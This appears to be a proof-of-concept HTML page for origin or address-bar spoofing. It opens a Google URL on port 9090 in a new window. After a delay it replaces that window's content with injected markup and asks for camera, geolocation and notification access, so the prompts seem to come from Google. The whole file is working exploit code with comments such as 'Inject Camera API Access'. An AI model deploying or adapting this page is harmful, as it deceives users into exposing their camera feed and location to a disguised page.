<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Access & Google CSI</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Welcome to API Access & Google CSI Demo</h1>
    <button onclick="accessData()">Open CSI & Access APIs</button>

    <script>
        function accessData() {
            // Open Google CSI (or any other target URL you want) in a new window
            var x = window.open('https://www.google.com:9090'); // Open Google CSI
            
            setTimeout(function() {
                // Simulate a page change with fake content
                x.document.body.innerHTML = `
                    <h1>API Access & Geolocation</h1>
                    <p>Access Camera and Location APIs:</p>
                    <button onclick="requestNotificationPermission()">Request Notification Permission</button>
                    <br><br>
                    <button onclick="getLocation()">Get Location</button>
                    <br><br>
                    <button onclick="openCamera()">Open Camera</button>
                    <br><br>
                    <h2>Camera Preview:</h2>
                    <video id="video" width="320" height="240" autoplay></video>
                    <iframe src="https://permission.site/" width="600" height="400"></iframe>

                `;

                // Inject Camera API Access
                if (x.navigator.mediaDevices && x.navigator.mediaDevices.getUserMedia) {
                    x.navigator.mediaDevices.getUserMedia({ video: true })
                        .then(function (stream) {
                            var video = x.document.getElementById('video');
                            video.srcObject = stream;
                        })
                        .catch(function (error) {
                            console.error('Error accessing camera: ', error);
                            x.alert('Unable to access camera. Please grant permission.');
                        });
                } else {
                    x.alert('Camera access is not supported by your browser.');
                }

                // Inject Geolocation API Access
                if (x.navigator.geolocation) {
                    x.navigator.geolocation.getCurrentPosition(function (position) {
                        var latitude = position.coords.latitude;
                        var longitude = position.coords.longitude;
                        x.document.body.innerHTML += `<p>Latitude: ${latitude}, Longitude: ${longitude}</p>`;
                    }, function (error) {
                        console.error('Error fetching location: ', error);
                        x.document.body.innerHTML += '<p>Unable to fetch location.</p>';
                    });
                } else {
                    x.alert('Geolocation is not supported by your browser.');
                }

                // Inject Notification Permission API
                function requestNotificationPermission() {
                    if (x.Notification.permission === 'granted') {
                        x.alert('Notification permission already granted');
                    } else if (x.Notification.permission !== 'denied') {
                        x.Notification.requestPermission().then(permission => {
                            if (permission === 'granted') {
                                x.alert('Notification permission granted');
                            } else {
                                x.alert('Notification permission denied');
                            }
                        });
                    } else {
                        x.alert('Notification permission denied');
                    }
                }

                // Inject Camera Function to Access Camera
                function openCamera() {
                    x.navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            const video = x.document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            x.document.body.appendChild(video);
                        })
                        .catch(err => {
                            x.alert('Camera denied or not available');
                        });
                }

                // Inject Get Location Function
                function getLocation() {
                    if (x.navigator.geolocation) {
                        x.navigator.geolocation.getCurrentPosition(position => {
                            x.alert("Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude);
                        }, error => {
                            x.alert("Location access denied or error.");
                        });
                    } else {
                        x.alert("Geolocation is not supported by this browser.");
                    }
                }
            }, 3000); // Wait for 3 seconds to simulate page load time
        }
    </script>
</body>
</html>
